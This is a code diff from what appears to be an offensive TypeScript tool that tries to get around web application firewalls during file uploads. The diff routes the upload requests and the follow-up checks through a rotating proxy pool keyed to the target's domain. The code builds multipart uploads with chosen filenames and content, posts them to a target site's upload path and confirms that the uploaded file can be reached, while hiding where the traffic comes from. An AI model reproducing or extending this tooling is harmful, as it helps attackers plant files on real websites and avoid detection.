@@ -12,6 +12,8 @@
  * 8. Encoding Bypass — base64, hex, URL-encode payloads
  */
 
+import { fetchWithPoolProxy } from "./proxy-pool";
+
 export interface WafBypassResult {
   method: string;
   success: boolean;
@@ -316,7 +318,8 @@ async function tryUploadWithBypass(
     const boundary = `----WebKitFormBoundary${Math.random().toString(36).slice(2)}`;
     const body = `--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="${filename}"\r\nContent-Type: ${contentType}\r\n\r\n${content}\r\n--${boundary}--`;
 
-    const resp = await fetch(url, {
+    const domain = new URL(targetUrl).hostname;
+    const { response: resp } = await fetchWithPoolProxy(url, {
       method: "POST",
       headers: {
         "Content-Type": `multipart/form-data; boundary=${boundary}`,
@@ -324,8 +327,7 @@ async function tryUploadWithBypass(
       },
       body,
       redirect: "follow",
-      signal: AbortSignal.timeout(timeout),
-    });
+    }, { targetDomain: domain, timeout });
 
     const status = resp.status;
 
@@ -336,10 +338,9 @@ async function tryUploadWithBypass(
 
       // Verify file exists
       try {
-        const checkResp = await fetch(possibleUrl, {
+        const { response: checkResp } = await fetchWithPoolProxy(possibleUrl, {
           method: "HEAD",
-          signal: AbortSignal.timeout(5000),
-        });
+        }, { targetDomain: domain, timeout: 5000 });
         if (checkResp.status >= 200 && checkResp.status < 400) {
           return {
             method: `waf_bypass_${technique}`,
@@ -458,12 +459,12 @@ export async function runWafBypass(config: WafBypassConfig): Promise<WafBypassRe
 
     try {
       const url = new URL(config.uploadPath, config.targetUrl).href;
-      const resp = await fetch(url, {
+      const domain = new URL(config.targetUrl).hostname;
+      const { response: resp } = await fetchWithPoolProxy(url, {
         method: "POST",
         headers: { "Content-Type": `multipart/form-data; boundary=${boundary}` },
         body,
-        signal: AbortSignal.timeout(timeout),
-      });
+      }, { targetDomain: domain, timeout });
 
       const possibleUrl = `${config.targetUrl.replace(/\/$/, "")}${config.uploadPath}${config.originalFilename}`;
       results.push({
